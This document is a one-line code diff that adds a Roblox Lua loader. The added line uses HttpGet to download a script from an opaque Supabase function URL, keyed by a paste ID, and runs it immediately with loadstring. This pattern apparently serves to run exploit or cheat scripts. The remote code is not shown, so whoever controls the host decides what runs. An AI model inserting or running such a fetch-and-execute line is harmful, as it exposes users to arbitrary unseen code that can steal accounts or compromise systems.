@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://msuelcjkfclhrnwuywte.supabase.co/functions/v1/get-paste?id=efc3bc35-1fa5-4b06-a3b8-3286fd1650e3"))()
